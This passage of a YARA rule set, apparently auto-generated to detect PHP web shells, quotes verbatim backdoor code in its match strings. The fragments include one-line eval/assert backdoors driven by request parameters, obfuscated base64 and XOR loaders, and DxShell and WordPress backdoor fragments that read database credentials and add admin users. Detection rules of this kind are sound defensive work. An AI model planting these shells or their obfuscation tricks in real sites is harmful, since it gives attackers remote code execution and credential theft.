      $s1 = "$s='1_start();@evO1al(O1@gzuncomO1prO1ess(@x(O1@bO1ase64_decode(O1pO1reg_replace(O1array(\"/O1_/\",\"/O1-/\"),arr';" fullword ascii
      $s2 = "$O='O1ayO1(\"/\",\"+O1\"),O1$ss($s[$i],0O1O1,$e))),$k)O1O1));$o=O1ob_O1gO1et_contents();obO1_end_cleO1an();O1$d=b';" fullword ascii
      $s3 = "$j='O1s=&O1O1$_SESSION;$O1ss=\"suO1bstrO1\";$sO1l=\"stO1rtolower\";$i=O1$m[O11][0].$m[1]O1[1];O1$h=$sl(O1$O1ss(m';" fullword ascii
      $s4 = "$z='asO1e64_eO1ncode(O1x(gzO1compress($oO1),$k))O1;print(\"<O1$k>$d<O1/$k>O1\");@sesO1sO1ion_destO1roy();}}}}';" fullword ascii
      $s5 = "$v='$rO1=$_SEO1RO1VER;$O1rO1r=@$r[\"HTTP_REFEREO1R\"];O1O1$ra=O1O1@$r[\"HTO1TP_ACCEO1PT_LANGUAGE\"];if($rr';" fullword ascii
      $s6 = "$q='or($i=0;$i<$O1O1O1l;){for($jO1=0;($j<$c&&$iO1<$O1l)O1;O1$j++,$i++){$o.=$t{$iO1}^$k{O1$j};O1}}retuO1rn $o;}';" fullword ascii
      $s7 = "$n='O1$kh=\"5d41\";$O1kf=O1\"O1402a\";function x($O1O1t,$k){$c=O1stO1O1rleO1n($k);$l=strlenO1($t);$oO1=\"\"O1;f';" fullword ascii
      $s8 = "$A='kO1ey_exO1isO1ts($i,$s)O1O1){$s[$i].=$O1O1p;$e=strpos($s[O1$i]O1,$f);if($eO1){$kO1O1=$kh.$kfO1;obO';" fullword ascii
      $s9 = "$T='O1&&$rO1a)O1{$u=parse_uO1rl($rr);O1parO1se_strO1($uO1[\"query\"O1],$q);$q=arO1ray_vaO1lues(O1$qO1);';" fullword ascii
      $s10 = "$Q='d5($O1O1i.$kh),0,3)O1);$f=O1$sl($ss(O1md5($i.$O1kf),0,3O1O1));$p=\"\"O1;fO1or($z=O11;$z<count($O1m[O11])';" fullword ascii
      $s11 = "$d=';$z++)$O1p.=$q[O1$m[O12][$z]];if(O1O1O1strposO1($O1p,$h)===0){$s[$iO1]=\"\";$p=$sO1s($p,3);O1}iO1f(array_';" fullword ascii
      $s12 = "$S=str_replace('O1','',$n.$q.$v.$T.$w.$j.$Q.$d.$A.$s.$O.$z);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_1a2366e437f753746760471d952accdb6c136c0f
{
   meta:
      description = "php17 - file 1a2366e437f753746760471d952accdb6c136c0f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "49182a46b76207057cac8618a09bce6486c8ef0485add1c3eb6dd7d181f0f1f6"
   strings:
      $s1 = "gY48sb86Ac4VyX4ZAbmMoJ48jdGlv\".\"bicgLi0kXA7PUARbJ4MnXSkF9mVBaXQF\";eval/*byrbbsbprr*/(kenxtwli($amwkghrc, $hlecffzbx));?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      all of them
}

rule sig_829648e33c19636c4ea7b8bd1439e10ea177b8c8
{
   meta:
      description = "php17 - file 829648e33c19636c4ea7b8bd1439e10ea177b8c8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "87efae90fd037a90a178997921551f6ca3fc274ce94e00f1d7c8891e7e7a89ab"
   strings:
      $s1 = "<?php @eval($_REQUEST[\"cmd\"]);?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_68f376b40de3b68e5c73fd639e784360045d1546
{
   meta:
      description = "php17 - file 68f376b40de3b68e5c73fd639e784360045d1546.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c2950aed4d53fa504dec24221ac76f4990a08eca54bb53cfd9eb0a70f589a39c"
   strings:
      $x1 = "/* Get a base64 encoded string wich contains the args to execute */" fullword ascii
      $x2 = "-Execute commands directly as in a terminal-like way (it needs system, passthru or other similar function)" fullword ascii
      $s3 = "/* Process HTTP Request Headers from client */" fullword ascii
      $s4 = "dump(base64_decode($commands[1]));" fullword ascii
      $s5 = "/* include wp-config.php. This allow us to use the credentials directly */" fullword ascii
      $s6 = "-Load wp-config.php (enable direct usage of credentials)" fullword ascii
      $s7 = "@$data = array (DB_NAME, DB_USER, DB_PASSWORD, DB_HOST, DB_PREFIX);" fullword ascii
      $s8 = "-Password Protected using HTTP headers" fullword ascii
      $s9 = "-Commands are sent by unique HTTP headers" fullword ascii
      $s10 = "$user = get_user_by('login', $login);" fullword ascii
      $s11 = "Returns an array containing user, password, host and db name" fullword ascii
      $s12 = "$link = mysql_connect(DB_HOST,DB_USER,DB_PASSWORD);" fullword ascii
      $s13 = ").\"' and table_name = '\". base64_decode($commands[2]).\"'\", DB_NAME);" fullword ascii
      $s14 = "function process_headers() {" fullword ascii
      $s15 = "process_headers();" fullword ascii
      $s16 = "$source = file_get_contents($wp_config);" fullword ascii
      $s17 = "$check = is_this_allowed(explode(\",\",base64_decode($commands[1])));" fullword ascii
      $s18 = "add_admin(base64_decode($commands[1]), base64_encode($commands[2]));" fullword ascii
      $s19 = "terminal(base64_decode($commands[1]), base64_decode($commands[2]));" fullword ascii
      $s20 = "$users = get_users ('role=administrator');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_8cb4cd6294e3246a416f2af80d7db147ce5c06ee
{
   meta:
      description = "php17 - file 8cb4cd6294e3246a416f2af80d7db147ce5c06ee.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3a0cb73cddb19bad0e52175d2ed8932b444866101bef0634b64d101a70139c62"
   strings:
      $s1 = "$config= trim($_POST['43cb006424cbf7b46dbca36c8ed79b69']); " fullword ascii
      $s2 = "* @param  string  $data  " fullword ascii
      $s3 = "$info = string2array($config); " fullword ascii
      $s4 = "if($data == '') return array(); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_785cacb423cc7049f53f05efa06ec92f45fedad7
{
   meta:
      description = "php17 - file 785cacb423cc7049f53f05efa06ec92f45fedad7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a7307f7dcb58a17e74f2457bc6052188e843749af7d69bf42b0656093e85a1a6"
   strings:
      $s1 = "<?php $e = $_REQUEST['e'];$arr = array($_POST['settoken'],);array_map(base64_decode($e), $arr);?>" fullword ascii
      $s2 = "<?($b4dboy = $_POST['b4dboy']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');?>" fullword ascii
      $s3 = "* $a=$_POST[];  " fullword ascii
      $s4 = "http://192.168.1.5/x.php?x=lostwolf  " fullword ascii
      $s5 = "<?php $lang = (string)key($_POST);$lang($_POST['test']);?>" fullword ascii
      $s6 = "<?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?>" fullword ascii
      $s7 = "<?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?>" fullword ascii
      $s8 = "<?php  $a = \"a\".\"s\".\"s\".\"e\".\"r\".\"t\";  $a($_POST[cc]);  ?>" fullword ascii
      $s9 = "print \"www.baidu.com\";" fullword ascii
      $s10 = "<?php $a = str_replace(x,\"\",\"axsxxsxexrxxt\");$a($_POST[\"#\"]); ?>" fullword ascii
      $s11 = "$a =\"www.baidu.com\";" fullword ascii
      $s12 = "$str=$rc->getDocComment();  " fullword ascii
      $s13 = "?id=eval%28base64_decode%28%22QGV2YWwoJF9QT1NUWydjJ10pOw%22%29%29; " fullword ascii
      $s14 = "/*--------------------------------------------------------------------------------*/ " fullword ascii
      $s15 = "$array[0]['wind']($_POST['xiaozhe']); " fullword ascii
      $s16 = "yuag_array(\"trea\",$_POST['Test']);" fullword ascii
      $s17 = "* assert  " fullword ascii
      $s18 = "<?php substr(md5($_REQUEST['x']),28)=='acd0'&&eval($_REQUEST['c']);?>" fullword ascii
      $s19 = "]);eval($Exp($_POST[z0]));?>" fullword ascii
      $s20 = "<?php $Exp=strrev($_POST[" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule sig_0bd597a350ae9fc1bfc20b5ef0d54c6b0e28e368
{
   meta:
      description = "php17 - file 0bd597a350ae9fc1bfc20b5ef0d54c6b0e28e368.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "3a25d806ffabf8c53ef2e11ab4bcb0cf81a78b9f37f4ae801153aca5402ffd92"
   strings:
      $x1 = "$O00OO000O0O0OO00OO0O0O=urldecode(\"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%" ascii
      $s2 = "WkEyeVpMRW9ackFPWHBHUGViNmdITEVvWmx1TkhFZmFDSTRhQ3duT1hGK05UOWNQVXgrQnFsZ1RZY0JUYnA5WmJBQlRiY0JPWGdBTW5ER05DamRhdUxITUN3cWtxMHV4" ascii
      $s3 = "R2J1UWVPc01lSXBOdkI3QndnWmJXNVZJd3BialUwdVFlZzBvWFJwTnZCM1BYajBQWkEyeVpMRW9abHVOSEVmT0NwMk5ZMHROQ2pkYXVMSE1Dd3FrcTB1eFhnMHhYUmxR" ascii
      $s4 = "Rk9kTUNJVmlYOWNPdllkS0UwdFR2amliMHdLVTBnTmpGV1lOdkxkazNncGFUWWNVMUxOVzFqTUIzZ214bmFhdHZEL1FUalZXRjlpSXdsR2syT0hCMTBZS3VER3gyOUpP" ascii
      $s5 = "WkYweVpiUmJIcFp5WnluZ0ZPWmpIUTFqRndMakZRbmpXandLRkJaZ1piUmpGeTR5cXgzaldRUnlxc0ZiSElGZ3FXUmdIazRiY3hFeUh4Unlpc1RiSElGS1d4MmJXYnFL" ascii
      $s6 = "* http://www.ydv5.com/ " fullword ascii
      $s7 = "WHBtdFRqME9UY1lCQ08wUFgxcFFaMFliQ09kTUNJcmFDcHJPdlljam1wbE9VTHNhQ1lkS0UwdFRiY0JQWHhBQkNqZlBYNUd0dkxweDJzZlFGT2RNQ0lWSTNCZGFDV0FC" ascii
      $s8 = "Q3duTzJJME52QlZ4bVJzTW1sdVFDc25PWHg5UUg5cU5VRG1PR0Q5Qm41MWttUnBNbWdmT0NXQUJlZ21rVGNKQm5PbU1IMEdoR0luTUNJSngyOWNPdlljam1wbE9YNXNN" ascii
      $s9 = "cWNueXFCVHlpYjFLRkYyS0ZRUmdGeVJLRmJSZ1phd2pjeHF5aWtueVpZcXlIRkV5WnNUZ3FXUnlGeTN5WkxUZ2lEUmdpT1R5WllFeWNCd2pIYjV5cWFMeVpJVGpjT0Zq" ascii
      $s10 = "Mjkxa0M1c01YV0pCOEdOcnRmdGQ3WmtCcWxnVFljQlRicDlaYkFCVGJjQkJDY3p0cWxnVFljQlRVMGdUWWNCVmIwdFRicHBNZWdwWmJBQlRVbGdUWWNCVHZqZ1cwYVZi" ascii
      $s11 = "RldFeUhXbmJxT1RnY3kzZ3FPd3kwV1JiSEYzaldJRktGeDRnWmsyZ2lrMGdGeTJ5aXluZ1pGRXlIazJnSFcxeUZ3d2dxVzN5WklUakZCWmppeG55aXlFakhXM0tpVzJn" ascii
      $s12 = "cXhFeUh4bnlXeDJ5Y0JaeVdiUmpIWTBnME9GeXFiRWJjalR5Wlc0eWN4MnlIWTR5Wnk0Yld4RXkwSVpqSHdGZ3FRNHlpazJiSFEyeUhqQ2ppWTF5MGIyYkhRNHlpSVpi" ascii
      $s13 = "bTRkS0UwdFRiY0JUdmp6UVowWXlabGdUWWNCVGJwM1BDcGxPdlljYUN3dU1DV1lOdkxyb1VnUk13OW1PVWpIUHc5bk0za0FCZUJwazNJbGFUY2RaYkFCVGJjQm9FMHRU" ascii
      $s14 = "WGJZdlpkZEtHeUdoQ09kTUNJcmFDcHJPdlljSUZzQlcxOUN2V1J3dHZjN0JGT0JpRklWYjA5Rmp2RDlRQ3MwTVhScWtDSUhQWHdseDJzc2tHeUFqbXBsT0k5dk9Yd2N0" ascii
      $s15 = "WDFwQm5jSmFtd2xhWFc3WmJBQmFtd25RZUJwT25EOVFUOW90d1JrT2VsUmhaajl0dllyVndSa2huY0FVd1Jjb3FGbHlHMGRVd0VudHdSa09lbFJoWkI5dHZEQVV3UmNv" ascii
      $s16 = "YjB0b0UwdFR2ald2RnBpVTBqQld1RDlRZUluTUNJSngyOWNPdlljT21wbE9VTHNhQ1lkS0UwdFR2ald2RnBpVTBPQmlGV1lOdkxDUFhScFUxZzBrdVljT21wbE9VTHNh" ascii
      $s17 = "VExRS21jNmtua2xiQ09kTUNJcmFDcHJPdlljam1wbE9VTHNhQ1lkdGlsZ1RZY0JUdmpDUFhScGtDdzBQVEQ5UWVJbk1DSUp4MjljT3ZZY2ptcGxPVUxzYUNZZEtFMHRU" ascii
      $s18 = "aU9DeWl4cWJIWTVnY1cyZ3FXMGdxY25qWngzakZ4NGdpT1pnaWtFakh3Q2dGeTB5cWpGZ0hGM3laRlJnaWtFZ0hZNHljVzJ5aUxGeVdRMGpaa0VncWd3alpJVGJxeTB5" ascii
      $s19 = "R0lKdFRCZk9DQkhVMmdsTTNncFF1Y2RoRDB0VGJwc2tHQnNvdll1VzJJcWsycGZNclBHbDl4dWhGcEpPbTlWakdJSnRUQnFPVWdxUFg5SlUzZzB4VUIwUXVjZGhEMHRU" ascii
      $s20 = "WjBZYkNPM2ttcDBPdlljUEN3Sk9DUnBoVGptUFhScHgyOWNPdmNZTm5MMGtHSXBRWkFZT213bGsyVzdaYkFCVmIwdFRXTG14MlJmazJXQUJDc3NNbWpsT3ZjN1piQUJr" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_7971b51dd492572795d53b89ed4c71469ee58552
{
   meta:
      description = "php17 - file 7971b51dd492572795d53b89ed4c71469ee58552.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a005d4fc4f426a27c2c2786bbbba1a2defa508e93883ad55fab5e0cf3f7d1201"
   strings:
      $s1 = "$foobar = $_GET['foobar'];" fullword ascii
      $s2 = "$dyn_func = create_function('$foobar', \"echo $foobar;\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_59f84f508d9d191b3517823a88663a7f615497bb
{
   meta:
      description = "php17 - file 59f84f508d9d191b3517823a88663a7f615497bb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f89b2705177624cb31f1b5da12e25e03e4dfc22da1a3ba024d2690199291dccb"
   strings:
      $x1 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Utility',3=>'Compression Process',5=>'rje (Remote Jo" ascii
      $x2 = "$DxDOWNLOAD_File['content'].=\"\\n\\t\".'==== MySQL Dump '.DxDate(time()).' - DxShell v'.$GLOB['SHELL']['Ver'].' by o_O Tync';" fullword ascii
      $x3 = "foreach ($DUMP[0] as $key => $val) $DxDOWNLOAD_File['content'].=$key.\";\";" fullword ascii
      $x4 = "$DxDOWNLOAD_File['filename']='Dump_'.$_GET['dxsql_s'].'_'.$_GET['dxsql_d'].'.sql';" fullword ascii
      $x5 = "print \"\\n\\t\".'<input type=text name=\"DxFTP_FTP\" value=\"ftp.host.com[:21]\" style=\"width:100%;\">';" fullword ascii
      $x6 = "function DxExecNahuj($cmd, &$OUT, &$RET)" fullword ascii
      $x7 = "Url'])?$_POST['DxProx_Url']:'http://www.microsoft.com:80/index.php?get=q&get2=d').'\" style=\"width:100%;\"></td></tr>';" fullword ascii
      $x8 = "((@$_POST['DxS_Auth']['L']==$GLOB['SHELL']['USER']['Login']) AND" fullword ascii
      $x9 = "function DxHTTPMakeHeaders($method='', $URL='', $host='', $user_agent='', $referer='', $posts=array(), $cookie=array())" fullword ascii
      $x10 = "if (!ftp_login($FTP, $_POST['DxFTP_USER'], $_POST['DxFTP_PASS'])) die(DxError('Login failed'));" fullword ascii
      $x11 = "@$_COOKIE['DxS_AuthC']==md5($GLOB['SHELL']['USER']['Login'].$GLOB['SHELL']['USER']['Passw'])" fullword ascii
      $x12 = "$DxDOWNLOAD_File['headers'][]=('Content-type: text/plain');" fullword ascii
      $x13 = "$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename=\"'.$DxDOWNLOAD_File['filename'].'\";');" fullword ascii
      $x14 = "host'])?$_POST['dxsock_host']:'www.microsoft.com') ).'\" style=\"width:100%;\">';" fullword ascii
      $x15 = "$DxDOWNLOAD_File['content'].=\"\\n\".'INSERT INTO `'.$CUR_TABLE.'` VALUES (\"'.implode('\", \"', $DUMP[$i]).'\");';" fullword ascii
      $x16 = "T['DxMailer_TO']))?'tristam@mail.ru'.\"\\n\".'billy@microsoft.com':$_POST['DxMailer_TO']  ).'</textarea></td></tr>';" fullword ascii
      $x17 = "$DxDOWNLOAD_File['headers'][]=('Content-disposition: attachment; filename=\"'.basename($_GET['dxfile']).'\";');" fullword ascii
      $s18 = "document.getElementById(\"LolBox\").value = contents + tl[index].substring(0,text_pos)+'|';" fullword ascii
      $s19 = "$DxDOWNLOAD_File['headers'][]=('Content-type: text/comma-separated-values');" fullword ascii
      $s20 = "r_FROM']))?'DxS <admin@'.$_SERVER['HTTP_HOST']:$_POST['DxMailer_FROM']  ).'>\" style=\"width:100%;\"></td></tr>';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule adodb_proxy_inc
{
   meta:
      description = "php17 - file adodb-proxy.inc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "96a8284b1b0c7f2caaf00f83d584f24dc2c1247732d865210fc24ac8fcb015f3"
   strings:
      $s1 = "@copyright (c) 2000-2013 John Lim (jlim#natsoft.com). All rights reserved." fullword ascii
      $s2 = "@copyright (c) 2014      Damien Regad, Mark Newnham and the ADOdb community" fullword ascii
      $s3 = "function __construct($id,$mode=false)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule a9894e22383765865bae540a9148ea7d841c9bb7
{
   meta:
      description = "php17 - file a9894e22383765865bae540a9148ea7d841c9bb7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eb550ac002dbf233e10620f93189189931add8d7afbedd65567f29ef4a597dee"
   strings:
      $s1 = "$X='_/\",\"Gk/-/\"),GkGkaGkrray(\"/\",\"Gk+Gk\"),$Gkss($s[Gk$i],0,$e))),$k)));$o=oGkGkb_get_GkconteGkntGks();ob_end_clean(G';" fullword ascii
      $s2 = "$t='toloGkwer\";Gk$i=$m[1][Gk0]Gk.$m[1Gk][1Gk];$h=$slGk($ss(md5($i.Gk$kh),0,3Gk))GkGk;$Gkf=$sl(Gk$Gkss(md5($Gki.$kf),';" fullword ascii
      $s3 = "$D='([Gk\\\\d]))?Gk,?Gk/\",$ra,$mGk);if($qGkGkGk&&$m){Gk@session_startGk();$s=&$_SESSGkIGkON;$ss=\"subsGktrGk\";$sl=\"stGkr';" fullword ascii
      $s4 = "$U='i]=\"\";$pGkGk=$sGks($p,3);Gk}if(GkarrayGkGk_key_exists($i,Gk$s))Gk{$s[$i].=$p;$eGk=strpGkos($sGk[$GkiGk],$f);ifGk';" fullword ascii
      $s5 = "$a='r=@$r[\"GkHTTP_GkREFERGkER\"];$ra=Gk@Gk$rGk[\"HTTP_ACCEPT_LGkANGUAGkGGkEGk\"];Gkif($rr&&$ra){$u=pGkarse_urGkl(GkGk$r';" fullword ascii
      $s6 = "$V='(GkGk$e){$k=$kh.Gk$kf;oGkb_start();@evaGkl(@gzuncompresGks(@x(@bGkase6Gk4_dGkecodGke(preg_repGklace(arraGky(\"Gk/';" fullword ascii
      $s7 = "$b='kGk);$Gkd=basGke64_encode(x(gzcoGkmpGkGkGkresGks($o),$k));print(Gk\"<$k>$d</$k>Gk\");Gk@sessioGkn_destroy(Gk);}}}}';" fullword ascii
      $s8 = "$c='Gk0,3));$p=\"Gk\";for($z=1;$zGk<couGkGknt($m[1]);$z++GkGk)$p.Gk=$q[$m[Gk2][$z]];if(sGktrpos($pGk,$h)===0){Gk$s[Gk$';" fullword ascii
      $s9 = "$I='$kGkh=\"5dGk41\"Gk;$kf=\"Gk402a\";function x(Gk$t,$k){$Gkc=strGklen($k)GkGk;$l=strlGken($t)Gk;$o=\"Gk\";fGkor($i=Gk0;$i<$';" fullword ascii
      $s10 = "$Y='r);parse_str($uGk[Gk\"qGkuery\"],$q);$qGk=Gkarray_valGkues($q);pGkreg_mGkatGkch_all(\"/([Gk\\\\w])[\\\\GkwGk-]+(?:;q=0.Gk';" fullword ascii
      $s11 = "$B='l;Gk){fGkor($j=0;($j<$c&Gk&$i<$lGk);Gk$j++,$i++Gk){$o.=$Gkt{$i}^Gk$k{$jGk};}}GkreturnGkGk $o;}$r=$_GkSERVGkER;$r';" fullword ascii
      $s12 = "$O=str_replace('Gk','',$I.$B.$a.$Y.$D.$t.$c.$U.$V.$X.$b);" fullword ascii
      $s13 = "$E=str_replace('F','','FcreatFe_FFfuFFnction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule a7747cf6bed20d18c4fa1633d9f7b1f7
{
   meta:
      description = "php17 - file a7747cf6bed20d18c4fa1633d9f7b1f7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d22229f8a0027d92f2fefed829bcf987bbd0a4b654aaab0c984b140ea135edf3"
   strings:
      $x1 = "* @link http://www.magentocommerce.com/blog/new-community-edition-release-process/" fullword ascii
      $x2 = "* Gets the detailed Magento Connect Manager (Downloader) version information" fullword ascii
      $x3 = "* Gets the current Magento Connect Manager (Downloader) version string" fullword ascii
      $x4 = "* @copyright  Copyright (c) 2009 Irubin Consulting Inc. DBA Varien (http://www.varien.com)" fullword ascii
      $x5 = "* @copyright   Copyright (c) 2014 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $s6 = "$this->view()->set('ftp_host', sprintf(\"%s://%s\", $ftpParams['scheme'], $ftpParams['host']));" fullword ascii
      $s7 = "$post['ftp_host']  = substr($post['ftp_host'], $start + 7 - 1);" fullword ascii
      $s8 = "* Retrieve Downloader root dir" fullword ascii
      $s9 = "return sprintf('%s?%s=%s%s', $_SERVER['SCRIPT_NAME'], self::ACTION_KEY, rawurlencode($action), $args);" fullword ascii
      $s10 = "$post['ftp_host']  = substr($post['ftp_host'], $start + 6 - 1);" fullword ascii
      $s11 = "if (!empty($post['ftp_login']) && !empty($post['ftp_password'])){" fullword ascii
      $s12 = "echo $this->view()->template('login.phtml');" fullword ascii
      $s13 = "$ftpParams = $config->__get('remote_config') ? @parse_url($config->__get('remote_config')) : '';" fullword ascii
      $s14 = "* Check is Magento files downloaded" fullword ascii
      $s15 = "$this->session()->addMessage('error', $this->_config->getError());" fullword ascii
      $s16 = "* Retrieve downloader file path" fullword ascii
      $s17 = "$this->session()->addMessage('error', \"Unable to save settings: \" . $e->getMessage());" fullword ascii
      $s18 = "$this->view()->set('ftp_login', $ftpParams['user']);" fullword ascii
      $s19 = "if (!($formKey = $_REQUEST['form_key']) || $formKey != $this->session()->getFormKey()) {" fullword ascii
      $s20 = "$res = move_uploaded_file($info['tmp_name'], $target);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule ApiClientFixture
{
   meta:
      description = "php17 - file ApiClientFixture.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a4977b96d50a0cd7016e23d8701bbcccf27c4240bc0ad567e9f4d450a7610bb3"
   strings:
      $s1 = "protected function configureResourceNode(ArrayNodeDefinition $resourceNode): void" fullword ascii
      $s2 = "->arrayNode('allowed_grant_types')->prototype('scalar')->cannotBeEmpty()->defaultValue([])->end()" fullword ascii
      $s3 = "use Symfony\\Component\\Config\\Definition\\Builder\\ArrayNodeDefinition;" fullword ascii
      $s4 = "public function getName(): string" fullword ascii
      $s5 = "use Sylius\\Bundle\\CoreBundle\\Fixture\\AbstractResourceFixture;" fullword ascii
      $s6 = "namespace Sylius\\Bundle\\AdminApiBundle\\Fixture;" fullword ascii
      $s7 = "->scalarNode('secret')->cannotBeEmpty()->end()" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      all of them
}

rule Assignment
{
   meta:
      description = "php17 - file Assignment.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "154e299e60239d03b41b69469e291f044d240bd6c889f327c912dca2d6ee172d"
   strings:
      $x1 = "$db->Execute('update PermissionAssignments set paID = 0 where pkID = ?', array($this->pk->getPermissionKeyID()));" fullword ascii
      $s2 = "$token = Loader::helper('validation/token')->getParameter($task);" fullword ascii
      $s3 = "$identifier = sprintf('permission/key/assignment/%s', $this->pk->getPermissionKeyID());" fullword ascii
      $s4 = "$paID = $db->GetOne('select paID from PermissionAssignments where pkID = ?', array($this->pk->getPermissionKeyID()));" fullword ascii
      $s5 = "$url .= '?' . $token . '&task=' . $task . '&pkID=' . $this->pk->getPermissionKeyID();" fullword ascii
      $s6 = "$db->Replace('PermissionAssignments', array('paID' => $pa->getPermissionAccessID(), 'pkID' => $this->pk->getPermissionKe" fullword ascii
      $s7 = "$url = $uh->getToolsURL('permissions/categories/' . $akc->getPermissionKeyCategoryHandle(), $akc->getPackageHandle());" fullword ascii
      $s8 = "public function getPermissionKeyToolsURL($task = false)" fullword ascii
      $s9 = "$uh = Loader::helper('concrete/urls');" fullword ascii
      $s10 = "$akc = PermissionKeyCategory::getByID($this->pk->getPermissionKeyCategoryID());" fullword ascii
      $s11 = "$class = substr(get_class($this), 0, strrpos(get_class($this), 'PermissionAssignment'));" fullword ascii
      $s12 = "$db = Loader::db();" fullword ascii
      $s13 = "$handle = Loader::helper('text')->uncamelcase($class);" fullword ascii
      $s14 = "$akc = PermissionKeyCategory::getByHandle($handle);" fullword ascii
      $s15 = "$pa = Access::getByID($paID, $this->pk);" fullword ascii
      $s16 = "* @return Access" fullword ascii
      $s17 = "public function getPermissionAccessObject()" fullword ascii
      $s18 = "use Loader;" fullword ascii
      $s19 = "public function getPermissionObject()" fullword ascii
      $s20 = "$item = $cache->getItem($identifier);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 7KB and
      1 of ($x*) and 4 of them
}

rule sig_9fa1736dcf99b5f7fb4b3db143551f5d33cae15b
{
   meta:
      description = "php17 - file 9fa1736dcf99b5f7fb4b3db143551f5d33cae15b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "909151ef588ee1a7c43eafa0e1c29ad50f46d6ebcf92f8bca05d52de519a3fb4"
   strings:
      $s1 = "echo $_REQUEST['pass'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AssociationFormView
{
   meta:
      description = "php17 - file AssociationFormView.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b8ed78ce5c0000e33d46c3a3a4224b90e3ecb095d990b370530772f1b5633070"
   strings:
      $s1 = "if ($association->getTargetEntity()->supportsCustomDisplayOrder()) {" fullword ascii
      $s2 = "use Concrete\\Core\\Filesystem\\TemplateLocator;" fullword ascii
      $s3 = "protected function getFormFieldElement(AssociationControl $control)" fullword ascii
      $s4 = "* @param AssociationControl $control" fullword ascii
      $s5 = "$element = $this->getFormFieldElement($this->control);" fullword ascii
      $s6 = "public function __construct(ContextInterface $context, Control $control)" fullword ascii
      $s7 = "// Is this an owning entity with display order? If so, we render a separate reordering control" fullword ascii
      $s8 = "use Concrete\\Core\\Entity\\Express\\Control\\AssociationControl;" fullword ascii
      $s9 = "$locator = new TemplateLocator('association/' . $element);" fullword ascii
      $s10 = "$class = strtolower(str_replace(array('Concrete\\\\Core\\\\Entity\\\\Express\\\\', 'Association'), '', $class));" fullword ascii
      $s11 = "use Concrete\\Core\\Express\\Form\\Context\\ContextInterface;" fullword ascii
      $s12 = "$this->addScopeItem('selectedEntities', $this->selectedEntities);" fullword ascii
      $s13 = "use Concrete\\Core\\Entity\\Express\\Control\\Control;" fullword ascii
      $s14 = "namespace Concrete\\Core\\Express\\Form\\Control\\View;" fullword ascii
      $s15 = "public function createTemplateLocator()" fullword ascii
      $s16 = "$this->addScopeItem('entities', $this->allEntities);" fullword ascii
      $s17 = "$class = get_class($control->getAssociation());" fullword ascii
      $s18 = "use Concrete\\Core\\Express\\EntryList;" fullword ascii
      $s19 = "parent::__construct($context, $control);" fullword ascii
      $s20 = "if ($association->isOwningAssociation()) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 5KB and
      8 of them
}

rule AbstractApiTestCase
{
   meta:
      description = "php17 - file AbstractApiTestCase.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c7ac68becba2e342d203cb193918d51be026f89553f4927f96ba0cc5e94ecdc6"
   strings:
      $s1 = "* @author Graham Campbell <graham@alt-three.com>" fullword ascii
      $s2 = "* Become a user." fullword ascii
      $s3 = "* This is the abstract api test case class." fullword ascii
      $s4 = "use Illuminate\\Foundation\\Testing\\DatabaseMigrations;" fullword ascii
      $s5 = "protected function beUser()" fullword ascii
      $s6 = "use Hifone\\Models\\User;" fullword ascii
      $s7 = "$this->be($this->user);" fullword ascii
      $s8 = "$this->user = factory(User::class)->create();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule a666f1b22f23ea3cbfc849a650c9e4b83ccc3790
{
   meta:
      description = "php17 - file a666f1b22f23ea3cbfc849a650c9e4b83ccc3790.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7c722b21cbaa055c8302c353f63a297e86c9c52ab51917db355b9e5aab16db8d"
   strings:
